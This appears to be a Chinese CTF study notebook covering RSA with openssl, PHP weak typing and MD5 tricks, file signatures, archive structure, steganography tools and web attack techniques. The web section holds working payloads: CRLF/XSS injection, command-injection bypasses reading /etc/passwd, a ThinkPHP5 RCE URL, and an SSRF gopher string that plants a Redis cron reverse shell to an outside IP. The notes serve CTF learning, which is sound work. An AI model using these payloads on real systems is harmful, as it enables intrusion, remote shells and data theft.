本文用于记录在解答CTF题目时，遇到的一些解体技巧和知识。

# 加密和解密

## RSA

### 利用openssl进行RSA加密解密

```shell
#生成一个密钥文件（test.key），包含公钥和私钥
openssl genrsa -out test.key 1024
#提取公钥
openssl rsa -in test.key -pubout -out test_pub.key
#公钥加密文件，-in指定要加密的文件，-inkey指定密钥，-pubin表明是用纯公钥文件加密，-out为加密后的文件。
openssl rsautl -encrypt -in hello -inkey test_pub.key -pubin -out hello.en 
#解密文件，-in指定被加密的文件，-inkey指定私钥文件，-out为解密后的文件。
openssl rsautl -decrypt -in hello.en -inkey test.key -out hello.de
```



# PHP弱类型

== 在进行比较的时候，会先将字符串类型转化成相同，再比较。如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行。

```php
<?php
var_dump("admin"==0);  //true
var_dump("1admin"==1); //true
var_dump("admin1"==1) //false
var_dump("admin1"==0) //true
var_dump("0e123456"=="0e4456789"); //true 
?> 
    
<?php
$test=1 + "10.5"; // $test=11.5(float)
$test=1+"-1.3e3"; //$test=-1299(float)
$test=1+"bob-1.3e3";//$test=1(int)
$test=1+"2admin";//$test=3(int)
$test=1+"admin2";//$test=1(int)
?>
```

**字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。**

## md5绕过

1. md5开头是0e的字符串，因此`md5('QNKCDZO')==md5('s878926199a')`。

   ```
   QNKCDZO
   0e830400451993494058024219903391
   
   s878926199a
   0e545993274517709034328855841020
     
   s155964671a
   0e342768416822451524974117254469
     
   s214587387a
   0e848240448830537924465865611904
     
   s214587387a
   0e848240448830537924465865611904
     
   s878926199a
   0e545993274517709034328855841020
     
   s1091221200a
   0e940624217856561557816327384675
     
   s1885207154a
   0e509367213418206700842008763514
   
   240610708
   0e462097431906509019562988736854
   
   //sha-1
   10932435112
   0e07766915004133176347055865026311692244
   ```

2. 数组绕过

    如果参数是两个数组，md5函数不能获取到值，可以绕过。 

   ```
   number1[]=123&number2[]=1234
   ```

## base64_decode绕过

数组绕过

```
number1[]=123&number2[]=1234
```

## json绕过

原理同上

## strcmp漏洞绕过

原理同上

## switch绕过

原理同上

# ASCII码表

| Bin(二进制) | Oct(八进制) | Dec(十进制) | Hex(十六进制) | 缩写/字符                   | 解释         |
| ----------- | ----------- | ----------- | ------------- | --------------------------- | ------------ |
| 0000 0000   | 00          | 0           | 0x00          | NUL(null)                   | 空字符       |
| 0000 0001   | 01          | 1           | 0x01          | SOH(start of headline)      | 标题开始     |
| 0000 0010   | 02          | 2           | 0x02          | STX (start of text)         | 正文开始     |
| 0000 0011   | 03          | 3           | 0x03          | ETX (end of text)           | 正文结束     |
| 0000 0100   | 04          | 4           | 0x04          | EOT (end of transmission)   | 传输结束     |
| 0000 0101   | 05          | 5           | 0x05          | ENQ (enquiry)               | 请求         |
| 0000 0110   | 06          | 6           | 0x06          | ACK (acknowledge)           | 收到通知     |
| 0000 0111   | 07          | 7           | 0x07          | BEL (bell)                  | 响铃         |
| 0000 1000   | 010         | 8           | 0x08          | BS (backspace)              | 退格         |
| 0000 1001   | 011         | 9           | 0x09          | HT (horizontal tab)         | 水平制表符   |
| 0000 1010   | 012         | 10          | 0x0A          | LF (NL line feed, new line) | 换行键       |
| 0000 1011   | 013         | 11          | 0x0B          | VT (vertical tab)           | 垂直制表符   |
| 0000 1100   | 014         | 12          | 0x0C          | FF (NP form feed, new page) | 换页键       |
| 0000 1101   | 015         | 13          | 0x0D          | CR (carriage return)        | 回车键       |
| 0000 1110   | 016         | 14          | 0x0E          | SO (shift out)              | 不用切换     |
| 0000 1111   | 017         | 15          | 0x0F          | SI (shift in)               | 启用切换     |
| 0001 0000   | 020         | 16          | 0x10          | DLE (data link escape)      | 数据链路转义 |
| 0001 0001   | 021         | 17          | 0x11          | DC1 (device control 1)      | 设备控制1    |
| 0001 0010   | 022         | 18          | 0x12          | DC2 (device control 2)      | 设备控制2    |
| 0001 0011   | 023         | 19          | 0x13          | DC3 (device control 3)      | 设备控制3    |
| 0001 0100   | 024         | 20          | 0x14          | DC4 (device control 4)      | 设备控制4    |
| 0001 0101   | 025         | 21          | 0x15          | NAK (negative acknowledge)  | 拒绝接收     |
| 0001 0110   | 026         | 22          | 0x16          | SYN (synchronous idle)      | 同步空闲     |
| 0001 0111   | 027         | 23          | 0x17          | ETB (end of trans. block)   | 结束传输块   |
| 0001 1000   | 030         | 24          | 0x18          | CAN (cancel)                | 取消         |
| 0001 1001   | 031         | 25          | 0x19          | EM (end of medium)          | 媒介结束     |
| 0001 1010   | 032         | 26          | 0x1A          | SUB (substitute)            | 代替         |
| 0001 1011   | 033         | 27          | 0x1B          | ESC (escape)                | 换码(溢出)   |
| 0001 1100   | 034         | 28          | 0x1C          | FS (file separator)         | 文件分隔符   |
| 0001 1101   | 035         | 29          | 0x1D          | GS (group separator)        | 分组符       |
| 0001 1110   | 036         | 30          | 0x1E          | RS (record separator)       | 记录分隔符   |
| 0001 1111   | 037         | 31          | 0x1F          | US (unit separator)         | 单元分隔符   |
| 0010 0000   | 040         | 32          | 0x20          | (space)                     | 空格         |
| 0010 0001   | 041         | 33          | 0x21          | !                           | 叹号         |
| 0010 0010   | 042         | 34          | 0x22          | "                           | 双引号       |
| 0010 0011   | 043         | 35          | 0x23          | #                           | 井号         |
| 0010 0100   | 044         | 36          | 0x24          | $                           | 美元符       |
| 0010 0101   | 045         | 37          | 0x25          | %                           | 百分号       |
| 0010 0110   | 046         | 38          | 0x26          | &                           | 和号         |
| 0010 0111   | 047         | 39          | 0x27          | '                           | 闭单引号     |
| 0010 1000   | 050         | 40          | 0x28          | (                           | 开括号       |
| 0010 1001   | 051         | 41          | 0x29          | )                           | 闭括号       |
| 0010 1010   | 052         | 42          | 0x2A          | *                           | 星号         |
| 0010 1011   | 053         | 43          | 0x2B          | +                           | 加号         |
| 0010 1100   | 054         | 44          | 0x2C          | ,                           | 逗号         |
| 0010 1101   | 055         | 45          | 0x2D          | -                           | 减号/破折号  |
| 0010 1110   | 056         | 46          | 0x2E          | .                           | 句号         |
| 0010 1111   | 057         | 47          | 0x2F          | /                           | 斜杠         |
| 0011 0000   | 060         | 48          | 0x30          | 0                           | 字符0        |
| 0011 0001   | 061         | 49          | 0x31          | 1                           | 字符1        |
| 0011 0010   | 062         | 50          | 0x32          | 2                           | 字符2        |
| 0011 0011   | 063         | 51          | 0x33          | 3                           | 字符3        |
| 0011 0100   | 064         | 52          | 0x34          | 4                           | 字符4        |
| 0011 0101   | 065         | 53          | 0x35          | 5                           | 字符5        |
| 0011 0110   | 066         | 54          | 0x36          | 6                           | 字符6        |
| 0011 0111   | 067         | 55          | 0x37          | 7                           | 字符7        |
| 0011 1000   | 070         | 56          | 0x38          | 8                           | 字符8        |
| 0011 1001   | 071         | 57          | 0x39          | 9                           | 字符9        |
| 0011 1010   | 072         | 58          | 0x3A          | :                           | 冒号         |
| 0011 1011   | 073         | 59          | 0x3B          | ;                           | 分号         |
| 0011 1100   | 074         | 60          | 0x3C          | <                           | 小于         |
| 0011 1101   | 075         | 61          | 0x3D          | =                           | 等号         |
| 0011 1110   | 076         | 62          | 0x3E          | >                           | 大于         |
| 0011 1111   | 077         | 63          | 0x3F          | ?                           | 问号         |
| 0100 0000   | 0100        | 64          | 0x40          | @                           | 电子邮件符号 |
| 0100 0001   | 0101        | 65          | 0x41          | A                           | 大写字母A    |
| 0100 0010   | 0102        | 66          | 0x42          | B                           | 大写字母B    |
| 0100 0011   | 0103        | 67          | 0x43          | C                           | 大写字母C    |
| 0100 0100   | 0104        | 68          | 0x44          | D                           | 大写字母D    |
| 0100 0101   | 0105        | 69          | 0x45          | E                           | 大写字母E    |
| 0100 0110   | 0106        | 70          | 0x46          | F                           | 大写字母F    |
| 0100 0111   | 0107        | 71          | 0x47          | G                           | 大写字母G    |
| 0100 1000   | 0110        | 72          | 0x48          | H                           | 大写字母H    |
| 0100 1001   | 0111        | 73          | 0x49          | I                           | 大写字母I    |
| 01001010    | 0112        | 74          | 0x4A          | J                           | 大写字母J    |
| 0100 1011   | 0113        | 75          | 0x4B          | K                           | 大写字母K    |
| 0100 1100   | 0114        | 76          | 0x4C          | L                           | 大写字母L    |
| 0100 1101   | 0115        | 77          | 0x4D          | M                           | 大写字母M    |
| 0100 1110   | 0116        | 78          | 0x4E          | N                           | 大写字母N    |
| 0100 1111   | 0117        | 79          | 0x4F          | O                           | 大写字母O    |
| 0101 0000   | 0120        | 80          | 0x50          | P                           | 大写字母P    |
| 0101 0001   | 0121        | 81          | 0x51          | Q                           | 大写字母Q    |
| 0101 0010   | 0122        | 82          | 0x52          | R                           | 大写字母R    |
| 0101 0011   | 0123        | 83          | 0x53          | S                           | 大写字母S    |
| 0101 0100   | 0124        | 84          | 0x54          | T                           | 大写字母T    |
| 0101 0101   | 0125        | 85          | 0x55          | U                           | 大写字母U    |
| 0101 0110   | 0126        | 86          | 0x56          | V                           | 大写字母V    |
| 0101 0111   | 0127        | 87          | 0x57          | W                           | 大写字母W    |
| 0101 1000   | 0130        | 88          | 0x58          | X                           | 大写字母X    |
| 0101 1001   | 0131        | 89          | 0x59          | Y                           | 大写字母Y    |
| 0101 1010   | 0132        | 90          | 0x5A          | Z                           | 大写字母Z    |
| 0101 1011   | 0133        | 91          | 0x5B          | [                           | 开方括号     |
| 0101 1100   | 0134        | 92          | 0x5C          | \                           | 反斜杠       |
| 0101 1101   | 0135        | 93          | 0x5D          | ]                           | 闭方括号     |
| 0101 1110   | 0136        | 94          | 0x5E          | ^                           | 脱字符       |
| 0101 1111   | 0137        | 95          | 0x5F          | _                           | 下划线       |
| 0110 0000   | 0140        | 96          | 0x60          | `                           | 开单引号     |
| 0110 0001   | 0141        | 97          | 0x61          | a                           | 小写字母a    |
| 0110 0010   | 0142        | 98          | 0x62          | b                           | 小写字母b    |
| 0110 0011   | 0143        | 99          | 0x63          | c                           | 小写字母c    |
| 0110 0100   | 0144        | 100         | 0x64          | d                           | 小写字母d    |
| 0110 0101   | 0145        | 101         | 0x65          | e                           | 小写字母e    |
| 0110 0110   | 0146        | 102         | 0x66          | f                           | 小写字母f    |
| 0110 0111   | 0147        | 103         | 0x67          | g                           | 小写字母g    |
| 0110 1000   | 0150        | 104         | 0x68          | h                           | 小写字母h    |
| 0110 1001   | 0151        | 105         | 0x69          | i                           | 小写字母i    |
| 0110 1010   | 0152        | 106         | 0x6A          | j                           | 小写字母j    |
| 0110 1011   | 0153        | 107         | 0x6B          | k                           | 小写字母k    |
| 0110 1100   | 0154        | 108         | 0x6C          | l                           | 小写字母l    |
| 0110 1101   | 0155        | 109         | 0x6D          | m                           | 小写字母m    |
| 0110 1110   | 0156        | 110         | 0x6E          | n                           | 小写字母n    |
| 0110 1111   | 0157        | 111         | 0x6F          | o                           | 小写字母o    |
| 0111 0000   | 0160        | 112         | 0x70          | p                           | 小写字母p    |
| 0111 0001   | 0161        | 113         | 0x71          | q                           | 小写字母q    |
| 0111 0010   | 0162        | 114         | 0x72          | r                           | 小写字母r    |
| 0111 0011   | 0163        | 115         | 0x73          | s                           | 小写字母s    |
| 0111 0100   | 0164        | 116         | 0x74          | t                           | 小写字母t    |
| 0111 0101   | 0165        | 117         | 0x75          | u                           | 小写字母u    |
| 0111 0110   | 0166        | 118         | 0x76          | v                           | 小写字母v    |
| 0111 0111   | 0167        | 119         | 0x77          | w                           | 小写字母w    |
| 0111 1000   | 0170        | 120         | 0x78          | x                           | 小写字母x    |
| 0111 1001   | 0171        | 121         | 0x79          | y                           | 小写字母y    |
| 0111 1010   | 0172        | 122         | 0x7A          | z                           | 小写字母z    |
| 0111 1011   | 0173        | 123         | 0x7B          | {                           | 开花括号     |
| 0111 1100   | 0174        | 124         | 0x7C          | \|                          | 垂线         |
| 0111 1101   | 0175        | 125         | 0x7D          | }                           | 闭花括号     |
| 0111 1110   | 0176        | 126         | 0x7E          | ~                           | 波浪号       |
| 0111 1111   | 0177        | 127         | 0x7F          | DEL (delete)                | 删除         |

# 常用文件头和尾

**JPEG (jpg)，**
文件头：FFD8FF　　 文件尾：FF D9　
　　　　　　　　　　　　　　
**PNG (png)，** 　
文件头：89504E47　 文件尾：AE 42 60 82

**GIF (gif)，** 　
文件头：47494638　 文件尾：00 3B

**ZIP Archive (zip)，**
文件头：504B0304　　 文件尾：50 4B

**TIFF (tif)，** 
文件头：49492A00

Windows Bitmap (**bmp)，** 
文件头：424D
　　　　　　
**CAD (dwg)，** 
文件头：41433130　
　　　　　　　　　　　　　　　　　　　　　
Adobe Photoshop **(psd)，**
文件头：38425053　
　　　　　　　　　　　　　　　　　　　　　
**Rich Text Format (rtf)**，
文件头：7B5C727466　
　　　　　　　　　　　　　　　　　　　
**XML (xml)，**
文件头：3C3F786D6C　
　　　　　　　　　　　　　　　　　　　
**HTML (html)，**
文件头：68746D6C3E

**Email [thorough only] (eml)**，
文件头：44656C69766572792D646174653A

**Outlook Express (dbx)，**
文件头：CFAD12FEC5FD746F
**Outlook (pst)**，
文件头：2142444E

**MS Word/Excel (\**xls.or.doc\**)，**
文件头：D0CF11E0

**MS Access (\**mdb\**)**，
文件头：5374616E64617264204A

**WordPerfect (\**wpd\**)，**
文件头：FF575043

**Adobe Acrobat \**(pdf\**)，**
文件头：255044462D312E

**Quicken \**(qdf)，\****
文件头：AC9EBD8F

**Windows Password (\**pwl)\**，**
文件头：E3828596

**RAR Archive (rar)**，
文件头：52617221

**Wave (wav)，** 文件头：57415645
**AVI (avi)，** 文件头：41564920
**Real Audio (ram)，** 文件头：2E7261FD
**Real Media (rm)**， 文件头：2E524D46
**MPEG (mpg)**， 文件头：000001BA
**MPEG (mpg)，** 文件头：000001B3
**Quicktime (mov)，** 文件头：6D6F6F76
**Windows Media (asf)，** 文件头：3026B2758E66CF11
**MIDI (mid)，** 文件头：4D546864

**PYC**（Python编译文件），文件头：03F30D0A

## RAR文件

Each block begins with the following fields:
        每一个块都是由以下域开始的：【译者注：即每一个块的头部都是由以下域（可称之为头域）组成的】
HEAD_CRC       2 bytes     CRC of total block or block part
                                                整个块或者块某个部分的CRC（根据块类型而有不同） 
HEAD_TYPE      1 byte      Block type
                                                块类型【译者注：也可以理解为块头部类型，因为不同的块对应不同的块头部。后文也经常混淆这两种概念。】
HEAD_FLAGS    2 bytes     Block flags
                                                块标志
HEAD_SIZE        2 bytes     Block size
                                                块大小【译者注：本文中和块头部大小的概念一直混淆。后文中当遇到标志块、结尾块等只有头部的块时，也可理解为块头部大小】
ADD_SIZE          4 bytes     Optional field - added block size
                                                添加块的大小（这是一个可选域）
      Field ADD_SIZE present only if (HEAD_FLAGS & 0x8000) != 0
       头域ADD_SIZE仅当（HEAD_FLAGS & 0x8000) != 0【译者注：即块标志的首位被置1】的时候才会存在
     Total block size is HEAD_SIZE if (HEAD_FLAGS & 0x8000) == 0

        当（HEAD_FLAGS & 0x8000) == 0【译者注：即块标志的首位被置0】的时候，整个块的大小就是HEAD_SIZE
     and HEAD_SIZE+ADD_SIZE if the field ADD_SIZE is present - when (HEAD_FLAGS & 0x8000) != 0.
        而当（HEAD_FLAGS & 0x8000) != 0【译者注：即块标志的首位被置1】的时候，整个块的大小就是（HEAD_SIZE+ADD_SIZE）

   In each block the followings bits in HEAD_FLAGS have the same meaning:
      HEAD_FLAGS域【块标志】的以下几位在每一个块中都有相同的含义：
  0x4000 - if set, older RAR versions will ignore the block and remove it when the archive is updated.
   【高二位】  （此位）如果置为1，老版本的rar会在归档文件更新的时候忽略这个块，并且移除这个块。

                   if clear, the block is copied to the new archive file when the archive is updated;
                         如果清为0，那么当更新的时候，这个块会被复制到新的归档文件中
  0x8000 - if set, ADD_SIZE field is present and the full block size is HEAD_SIZE+ADD_SIZE.
   【最高位】  （此位）如果置为1，就会存在ADD_SIZE这个域，并且整个块的大小就应该是（HEAD_SIZE+ADD_SIZE）

  Declared block types:
       已经声明过的块类型包括：
HEAD_TYPE=0x72          marker block【译者注：有些文献里也称之为MARK_HEAD】
                                           标志块【译者注：一个固定为0x52 61 72 21 1A 07 00的7字节序列】
HEAD_TYPE=0x73          archive header【译者注：有些文献里也称之为MAIN_HEAD】
                                           归档头部块
HEAD_TYPE=0x74          file header【译者注：有些文献里也称之为FILE_HEAD】
                                           文件块【译者注：直译为文件头部，但是此处的类型应该指的是整个块的类型，而非块头部结构的类型，因此感觉称之为文件块更合适。】
HEAD_TYPE=0x75          old style comment header
                                           老风格的 注释块【译者注：直译为注释头部，基于和文件块一样的原因，感觉称之为注释块更合适】
HEAD_TYPE=0x76          old style authenticity information
                                           老风格的 授权信息块/用户身份信息块
HEAD_TYPE=0x77          old style subblock
                                           老风格的 子块
HEAD_TYPE=0x78          old style recovery record
                                           老风格的 恢复记录块
HEAD_TYPE=0x79          old style authenticity information
                                           老风格的 授权信息块/用户身份信息块
HEAD_TYPE=0x7a          subblock
                                           子块
HEAD_TYPE=0x7b          end block
                                            结束块【译者注：一个固定为0xC4 3D 7B 00 40 07 00的7字节序列】
   Comment block is actually used only within other blocks and doesn't exist separately.
        注释块实际上只在其它块中使用，并不单独存在

# 逆向

## 编译.c文件

```shell
gcc -o code code.c
```

## 编译C++文件

在kali中编译

```shell
#编译文件
gcc -o hello hello.cpp -lstdc++
#执行编译好的文件
./hello 
```

## 反编译.PYC文件

使用Easy Python Decompiler。

# 隐写

## 图片隐写术

图片隐写术就是利用图片来隐藏一些机密信息，让别人看起来以为是一张很普通的图片而不容易被察觉。

### 图种

所谓图种，就是先把要想隐藏的东西用zip打包压缩，然后再跟一张正常的图片结合起来，达到隐藏信息的目的。

1. 使用binwalk检查图片中是否隐藏了其他的文件
2. 使用binwalk或者foremost分离文件。

### LSB隐写

LSB隐写，也就是最低有效位 (Least Significant Bit)。

使用Stegsolve程序打开图片， 然后通过下方的按钮切换 ，就可以看到隐藏的内容。

### 文件格式缺失&GIF隐写

使用winhex打开图片，查看文件是否有缺失。一般来说都是文件头部缺失。修复之后，正常打开图片，查看图片中内容。对于GIF图，如果FLAG一闪而过，可以使用Stegsolve打开图片， Analyse 》FrameBrower ，查看每一帧的内容。

### IHDR

PNG图片修改高度显示隐藏信息，IHDR后面8位是宽和高（宽和高各占4位）。

![image-20191109221434439](F:\LearningMaterials\Record\记录\images\image-20191109221434439.png)

### outguess

工具安装在kali中

```shell
outguess -r /root/angrybird.jpg -t 11.txt
```

### zsteg

工具安装在Kali中

```shell
#查看LSB信息
zsteg 111.bmp
#检测zlib
# -b的位数是从1开始的
zsteg zlib.bmp -b 1 -o xy -v
#显示细节
zsteg pcat.png -v
#尝试所有已知的组合
zsteg pcat.png -a
#导出内容
zsteg -E "b1,bgr,lsb,xy" pcat.png > p.exe
```

### gif

按帧分离和拼接：使用convert命令

每帧重叠显示：使用ps打开gif文件，显示所有图层。

## 压缩包隐写术

一个ZIP文件由三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志

### 伪加密

zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。

压缩源文件数据区：
50 4B 03 04：这是头文件标记（0x04034b50）
14 00：解压文件所需 pkware 版本
00 00：全局方式位标记（有无加密）
08 00：压缩方式
5A 7E：最后修改文件时间
F7 46：最后修改文件日期
16 B5 80 14：CRC-32校验（1480B516）
19 00 00 00：压缩后尺寸（25）
17 00 00 00：未压缩尺寸（23）
07 00：文件名长度
00 00：扩展记录长度

压缩源文件目录区：
50 4B 01 02：目录中文件文件头标记(0x02014b50)
3F 00：压缩使用的 pkware 版本
14 00：解压文件所需 pkware 版本
**00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）**
08 00：压缩方式
5A 7E：最后修改文件时间
F7 46：最后修改文件日期
16 B5 80 14：CRC-32校验（1480B516）
19 00 00 00：压缩后尺寸（25）
17 00 00 00：未压缩尺寸（23）
07 00：文件名长度
24 00：扩展字段长度
00 00：文件注释长度
00 00：磁盘开始号
00 00：内部文件属性
20 00 00 00：外部文件属性
00 00 00 00：局部头部偏移量

压缩源文件目录结束标志：
50 4B 05 06：目录结束标记
00 00：当前磁盘编号
00 00：目录区开始磁盘编号
01 00：本磁盘上纪录总数
01 00：目录区中纪录总数
59 00 00 00：目录区尺寸大小
3E 00 00 00：目录区对第一张磁盘的偏移量
00 00：ZIP 文件注释长度

### Zip密码爆破

使用工具暴力破解，工具：Advanced Archive Password Recovery

掩码使用？替换。????LiHua ，就是以LiHua结尾的9位密码。



## 其他隐写术

### MP3隐写术

MP3隐写两种方式：

第一种：题目中给了密码了，用mp3stego去解密。

第二种：如果在题目中没有给key，而附件只给了一个MP3，那就有可是用mp3stego隐藏的数据，也有可能是在音轨的频谱中隐藏了数据。

MP3stego要在cmd命令提示符中打开，需要换盘到我们存储文件的分区，具体方法如下：

①、开始->运行->CMD

②、进入某个磁盘，直接盘符代号：如D：

③、进入除根录以下的文件夹 cd 文件夹路径 例如我要进入 E:/123/321 就输入 E：回车

然后将MP3stego解码程序所在的目录粘贴到cmd中，在开始分析之前，要先把准备分析的MP3文件粘贴到decode.exe所在目录中

### 音频

工具：Audacity

使用Audacity打开音频。

<img src="../../images/15160874983595.png" style="zoom:50%;" />

切换显示类型，可以获得相关解题信息，例如攻防世界-Hear With Your Eyes，切换到频谱图就可以直接看到flag，获取切换到波形图，按照高：1，低：0转化波形图，就可以得到01字符串，转为ASCII码得到flag。

### PDF隐写

Office系列软件作为优秀的办公软件为我们提供了极大的便利，其中的Word、Excel、PowerPoint提供了许多在文档中隐藏数据的方法，比如批注、个人信息、水印、不可见内容、隐藏文字和定制的XML数据。今天我们涉及到的就是提到的隐藏文本功能。

利用PDF文件头添加额外信息，这个区域的信息会被Adobe Acrobat Reader阅读器忽略。

工具：wbStego4open

wbStego4open会把插入数据中的每一个ASCII码转换为二进制形式，然后把每一个二进制数字再替换为十六进制的20或者09，20代表0，09代表1。

最后，这些转换后的十六进制数据被嵌入到PDF文件中。查看用wbStego4open修改后的文件内容，会发现文件中已混入了很多由20和09组成的8位字节

### DOC隐藏

Doc文件的本质是一个压缩文件，常见的隐藏文本的方式有两种，即：将字体隐藏或者设置同色字体，以下就是一个字体隐藏的例子。

点击左上角文件-选项，打开Word选项对话框，在“显示”中勾选隐藏文字选项。

### 数据包隐写术

数据包隐写术，就是将所要传达的信息和文件，以流量包的形式下发给参赛选手，参赛选手要从流量包中自行提取出所需要的文件或者相关内容进行解题。比较常用的工具是wireshark。关于此类部分的详细介绍，大家可以访问这个网址：https://ctf-wiki.github.io/ctf-wiki/misc/traffic/data/

### wireshark

wireshark automatic analysis

```
file -> export objects -> http
```

Manual Data Extraction

```
file->export selected Packet Bytes
```

数据包隐写术目前两种考察行为：

1. flag或者关键信息直接隐藏在流量包中

2. flag相关文件隐藏在流量包中，需要分离文件

   可以使用`tcpxtract`来分离文件。

   ```shell
   tcpxtract 1.pcap
   ```


### git

![git常用命令](E:\StudyRecord\记录\images\18087435-bf2a996ef50a21b0.webp)

恢复存储区的文件，例如攻防世界-MISCall。

```shell
#查看修改列表，储存列表中有一条记录
git stash list
#校验一下列表中的存储文件
git stash show
#文件恢复
git stash apply
```

git源码泄露，查看Web-信息泄露的内容。

# MISC（杂项）

## linux image

```shell
#挂载镜像到out目录
mount disk-image /out/

#数据恢复  恢复全部数据
extundelete disk-image --restore-all

#查看根节点信息
extundelete disk-image --inode 2

#恢复指定目录
extundelete disk-image --restore-directory /webapps/xxxx/upload
```

# Web

## 信息泄露

* robots.txt

* comment(注释信息)

* vim swap/backup file(.bak/.php./.php~/.php.swp)

  ```shell
  vim -r .index.php.swp #转化为index.php
  ```

* .pyc

  ```shell
  cat flag.pyc  #查看.pyc文件的内容，flag可能可以直接找到。
  ```

  还原.pyc文件，使用`uncompyle2`

  ```shell
  #uncompyle2工具在kali虚拟机中
  uncompyle2 -o f.py flag.pyc  # f.py还原好的文件  flag.pyc需要还原的文件
  ```

* .DS_Store

  ds_store_exp，这是一个 .DS_Store 文件泄漏利用脚本，它解析.DS_Store文件并递归地下载文件到本地。

  ```shell
  python ds_store_exp.py http://www.example.com/.DS_Store
  ```

  或者

  ```python
  from ds_store import DSStore
  with DSStore.open('.DS_Store', 'r+') as d:
  	for i in d:
  		print(i)
  ```

* .git

  ```shell
  python GitHack.py http://x.x.x.x/.git/
  ```

* .svn

  ```
  http://127.0.0.1/.svn/entries
  ```

  工具：Seay SVN漏洞利用工具

* bak file(.tar.gz/.rar/.zip/.7z/.bak)

## SQL注入

### 简单注入

联合查询

宽字节

Cookie

大小写、双写

### 花式绕WAF

char,hex

干扰字符 /特性

白名单 spider

### 二次注入

写入数据库的时候，保留了原数据

### SQLite



## DNSLog注入

## nosql注入

### mangodb

## CRLF注入

CRLF 注⼊是⼀类漏洞，在⽤户设法向应⽤插⼊ CRLF 时出现。在多种互联⽹协议中，包括 HTML， CRLF 字符表示了⾏的末尾，**通常表示为\r\n，编码后是%0D%0A**。在和 HTTP 请求或响应头组合时，这可以⽤于表示⼀⾏的结束，并且可能导致不同的漏洞，包括 HTTP 请求⾛私和 HTTP 响应分割。

```
http://victim/foo?url=http://example.com
GET /foo HTTP/1.1
Content-Type: text/html
Connection: close
Location: http://example.com


http://victim/foo?url=http://example.com%0aSetcookie:PHPSESSION%3dadmin
GET /foo HTTP/1.1
Content-Type: text/html
Connection: close
Location: http://example.com
Set-cookie: PHPSESSION=admin
```



```
index.php?url=http://example.com/%0aX-XSS-Protection:
%200%0a%0d%0a%0d<img%20src=1%20onerror=alert(/xss/)>

GET /index.php HTTP/1.1
Content-Type: text/html
Connection: close
Location: http://example.com/
X-XSS-Protection: 0
<img src=1 onerror=alert(/xss/)>
```

## 命令注入

```php
<?php
if (isset($_GET['ip'])) {
	$cmd = 'ping -c1 '.$_GET['ip'];
	system($cmd);
}

//index.php?ip=;cat /etc/passwd
```

绕过过滤

```shell
cat<>flag.txt
cat<flag.txt
cat${IFS}flag.txt

a=c;b=at;c=flag.txt;$a$b $c
`echo Y2F0IGZsYWcudHh0Cg==|base64 -d`
ca""t flag.txt
c""at fl""ag.txt
c\at fl\ag.txt
```

## SSRF

1. dict protocol (操作Redis)
   curl -vvv 'dict://127.0.0.1:6379/info'  

2.   file protocol (任意⽂件读取)  

   curl -vvv 'file:///etc/passwd'  

3.   gopher protocol (⼀键反弹Bash)  

   curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%%0d%0a......**......'  

## 文件上传

## PHP

1. 考察点为REQUEST变量覆盖、MD5绕过、file_get_contents写入、正则绕过。

   ```php
   include "flag.php";
   error_reporting(0);
   if($_REQUEST){
   foreach ($_REQUEST as $key => $value) {
   if(preg_match('/[a-zA-Z]/i', $value)){
   die("其实我劝你最好不要输入任何字母!");
               }
           }
       }
   
   if($_SERVER){
       if(!preg_match('/GJCTF|flag/i', $_SERVER['QUERY_STRING'])) die('不打你可能拿不到flag..');
   }
   if(isset($_GET['GJCTF'])){
       if(!(substr($_GET['GJCTF'], 32) === md5($_GET['GJCTF']))){
           die('日爆md5!!!!!!');
       }else{
       $getflag = file_get_contents($_GET['flag']);
       if($getflag === 'get_flag'){
       include 'flag.php';
       echo $flag;
       }else die('差一点哦!');
       }
   }
   GJCTF{You_A4e_@_Good_Hacker}
   ```

   REQUEST变量可以使用POST和GET变量同时覆盖，即当POST和GET参数名字相同时，REQUEST只能接收到POST参数并处理，并不会处理同名GET参数。正则和MD5以及substr都可以通过数组来绕过，这里算NULL绕过了。
   file_get_contents可诸如的方法有data://和php://input两种，但是由于正则过滤的原因，导致POST值会被正则拦下，所以php://input无法使用，因为POST参数会被处理，所以只能使用data://协议。

   ![](F:\LearningMaterials\Record\记录\images\1.PNG)


### 序列化serialize

   ```php
   $key = "D0g3!!!";
   echo serialise($key);//序列化
   echo unserialize('s:7:"D0g3!!!";');//反序列化 s:7:"D0g3!!!";
   ```

当成员属性数目大于实际数目时可绕过wakeup方法。

```php
class xctf{
	public $flag = '111';
	public function __wakeup(){
		exit('bad requests');
	}
......
```

#### 绕过wakeup

序列化后的值为`O:4:"xctf":1:{s:4:"flag";s:3:"111";}`，变为`O:4:"xctf":2:{s:4:"flag";s:3:"111";}`可绕过__wakeup方法。

#### 绕过preg_match

```php
if (preg_match('/[oc]:\d+:/i', $var)) { 
    die('stop hacking!'); 
} else {
    @unserialize($var); 
} 
//"O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}"  会被拦截
//"O:+4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}" 可以绕过preg_match
```

### 伪协议

#### php://input

php://input是用来接收post数据的。

#### data://

```
data://text/plain,<?php phpinfo()?>

data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=

data:text/plain,<?php phpinfo()?>

data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
```

#### data://filter

```
php://filter/read=convert.base64-encode/resource=[文件路径]
```

### 函数漏洞

#### preg_replace

preg_replace漏洞触发有两个前提：

01：第一个参数需要e标识符，有了它可以执行第二个参数的命令

02：第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令，举个例子：

```
//echo preg_replace('/test/e', 'phpinfo()', 'just test');
//这样是可以执行命令的

//echo preg_replace('/test/e', 'phpinfo()', 'just tesxt'); 
//echo preg_replace('/tesxt/e', 'phpinfo()', 'just test'); 
//这两种没有匹配上，所以返回值是第三个参数，不能执行命令
```

不能使用空格隔开，可用%20或者+代替，%26%26为&&，&&意思是当前面命令执行成功时，继续执行后面的命令。

### php-rce（thinkphp5 ）

远程代码执行漏洞

```url
http://127.0.0.1/public/index.php?s=index/\think\Request/input&data=phpinfo()&filter=assert
```

